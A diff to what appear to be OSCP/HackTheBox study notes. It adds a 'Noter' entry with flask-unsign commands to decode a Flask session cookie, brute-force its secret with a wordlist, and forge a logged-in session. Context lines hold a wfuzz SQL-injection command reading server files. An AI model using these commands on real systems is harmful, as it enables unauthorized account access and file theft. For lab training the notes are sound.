@@ -33,6 +33,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
 | Nibbles | page source, directory | sudo list |
 | *NineVeh | brute force attack http & https, phpLiteAdmin | crontab, chkrootkit |
+| Noter | cookie (flask-unsign) ||
 | OpenAdmin | OpenNetAdmin, pwd in conf file & <br> reverse proxy, cracking passphrase | sudo list, GTFO |
 | *Ophiuchi | [Java-Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), SnakeYAML | sudo list, analysis of GO code |
 | Passage | CutePHP & password storage location & <br> base64 & cracking | *SUID dbus |
@@ -508,4 +509,21 @@ Used in ```Writer```
 
 ```
 wfuzz -z file,/tmp/file_inclusion_linux.txt -d "uname=admin' union select 1,LOAD_FILE('FUZZ'),3,4,5,6; -- -&password=1234" --hw 89 http://writer.htb/administrative
+```
+
+Used in ```Noter```
+
+```shell
+# cannot import name 'json' from 'itsdangerous'
+pip install Flask==2.0.1
+```
+
+```shell
+# If the generated cookie does not work, note the system time in the VM.
+# decode cookie
+flask-unsign --decode --cookie "<cookie>"
+# brute forcing secret key
+flask-unsign --unsign --cookie "<cookie>" --wordlist ~/Documents/rockyou.txt --no-literal-eval
+# create session 
+flask-unsign --sign --cookie "{'logged_in': True, 'username': '<username>'}" --secret <keystring>
 ```
